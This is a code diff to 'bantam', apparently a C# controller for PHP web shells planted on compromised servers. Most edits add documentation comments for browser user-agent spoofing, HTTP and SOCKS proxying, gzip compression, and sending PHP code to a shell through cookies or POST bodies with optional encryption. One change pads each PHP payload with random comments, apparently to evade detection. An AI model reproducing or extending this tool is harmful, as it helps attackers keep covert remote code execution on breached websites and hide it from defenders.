@@ -15,7 +15,7 @@ namespace bantam.Classes
     static class WebHelper
     {
         /// <summary>
-        /// 
+        /// Array of default / known useragents to choose from
         /// </summary>
         public static readonly Dictionary<int, string> commonUseragents = new Dictionary<int, string> {
             {0, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36"},
@@ -34,7 +34,7 @@ namespace bantam.Classes
         };
 
         /// <summary>
-        /// 
+        /// Shared HttpClient resource to use for all requests
         /// </summary>
         /// 
         private static HttpClient client = new HttpClient(new HttpClientHandler {
@@ -42,7 +42,7 @@ namespace bantam.Classes
         });
 
         /// <summary>
-        /// 
+        /// Refreshes the Httpclient without using the proxy
         /// </summary>
         public static void ResetHttpClient()
         {
@@ -55,7 +55,7 @@ namespace bantam.Classes
         }
 
         /// <summary>
-        /// 
+        /// Add's a HTTP proxy to the HTTPClient Handler and refreshes the shared HttpClient
         /// </summary>
         /// <param name="proxyUrl"></param>
         /// <param name="proxyPort"></param>
@@ -72,7 +72,7 @@ namespace bantam.Classes
         }
 
         /// <summary>
-        /// 
+        /// Add's a sock's proxy to the HTTPClient Handler using "SocksSharp" and refreshes the shared HttpClient
         /// </summary>
         /// <param name="proxyUrl"></param>
         /// <param name="proxyPort"></param>
@@ -91,10 +91,10 @@ namespace bantam.Classes
         }
 
         /// <summary>
-        /// 
+        /// GZip compresses a bytes stream
         /// </summary>
-        /// <param name="input"></param>
-        /// <param name="removeHeader"></param>
+        /// <param name="input">Bytes stream to compress</param>
+        /// <param name="removeHeader">Removes GZip header from stream, Gzip Stream contains a header that PHP's gzXXX functions do not have</param>
         /// <returns></returns>
         public static byte[] GzCompress(byte[] input, bool removeHeader = true)
         {
@@ -123,10 +123,10 @@ namespace bantam.Classes
         }
 
         /// <summary>
-        /// 
+        /// Creates a Task that executes a basic GET request (todo) - expand
         /// </summary>
-        /// <param name="url"></param>
-        /// <returns></returns>
+        /// <param name="url">The URL to request</param>
+        /// <returns>string : result</returns>
         public static async Task<string> GetRequest(string url)
         {
             try {
@@ -148,10 +148,10 @@ namespace bantam.Classes
         }
 
         /// <summary>
-        /// 
+        /// Creates a Task that executes a basic POST request (todo) - expand
         /// </summary>
         /// <param name="url"></param>
-        /// <returns></returns>
+        /// <returns>string result</returns>
         public static async Task<string> PostRequest(string url, Dictionary<string, string> values)
         {
             try {
@@ -200,7 +200,7 @@ namespace bantam.Classes
             bool encryptRequest = BantamMain.Shells[url].RequestEncryption;
             bool sendRequestEncryptionIV = BantamMain.Shells[url].SendRequestEncryptionIV;
 
-            string phpCode = phpCodeIn;
+            string phpCode = PhpBuilder.RandomPHPComment() + phpCodeIn + PhpBuilder.RandomPHPComment();
 
             if (string.IsNullOrEmpty(phpCode)) {
                 LogHelper.AddShellLog(url, "Attempted to execute empty/null code...", LogHelper.LOG_LEVEL.WARNING);
@@ -284,7 +284,7 @@ namespace bantam.Classes
 
                 if (sendViaCookie) {
                     if (phpCode.Length > Config.MaxCookieSizeB) {
-                        LogHelper.AddShellLog(url, "Attempted to execute request larger than Cookie Size Max...", LogHelper.LOG_LEVEL.ERROR);
+                        LogHelper.AddShellLog(url, "Attempted to execute a request larger than Max Cookie Size...", LogHelper.LOG_LEVEL.ERROR);
                         return new ResponseObject(string.Empty, string.Empty, string.Empty);
                     }
 
@@ -293,9 +293,9 @@ namespace bantam.Classes
                     if (encryptRequest && sendRequestEncryptionIV) {
                         request.Headers.TryAddWithoutValidation("Cookie,", requestEncryptionIV_VarName + "=" + HttpUtility.UrlEncode(requestEncryptionIV));
                     }
-                    phpCode = null;
                 } else {
                     string postArgs = string.Empty;
+
                     if (encryptRequest && sendRequestEncryptionIV) {
                         postArgs = string.Format(requestArgsName + "={0}&{1}={2}", phpCode, requestEncryptionIV_VarName, HttpUtility.UrlEncode(requestEncryptionIV));
                     } else {
@@ -303,15 +303,13 @@ namespace bantam.Classes
                     }
 
                     int maxPostSizeBytes = (Config.MaxPostSizeKib * 1000);
+
                     if (postArgs.Length > maxPostSizeBytes) {
                         LogHelper.AddShellLog(url, "Attempted to execute request larger than Post Size Max...", LogHelper.LOG_LEVEL.ERROR);
                         return new ResponseObject(string.Empty, string.Empty, string.Empty);
                     }
 
                     request.Content = new StringContent(postArgs, Encoding.UTF8, "application/x-www-form-urlencoded");
-
-                    phpCode = null;
-                    postArgs = null;
                 }
 
                 using (HttpResponseMessage response = await client.SendAsync(request, HttpCompletionOption.ResponseHeadersRead)) {
